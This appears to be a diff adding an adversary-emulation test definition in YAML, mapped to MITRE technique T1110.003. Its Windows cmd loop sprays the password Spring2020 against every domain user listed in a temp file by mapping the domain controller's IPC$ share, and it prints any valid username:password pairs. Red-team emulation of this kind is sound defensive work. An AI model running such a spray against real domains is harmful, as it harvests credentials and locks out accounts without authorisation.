@@ -1,0 +1,24 @@
+- id: b73993a7-a09c-5a80-982a-a8e821becc24
+  name: Soumaia ART Tests - Password Spray all Domain Users
+  description: 'CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
+
+    This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
+
+    Use the get_prereq_command''s to create a list of all domain users in the temp directory called users.txt.
+
+    See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5'
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          cmd /c "if not exist %temp%\users.txt (exit /b 1)"
+          if not "%ERRORLEVEL%"=="0" (
+              cmd /c """.\parse_net_users.bat"""
+          )
+          @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL
+        payloads:
+        - parse_net_users.bat
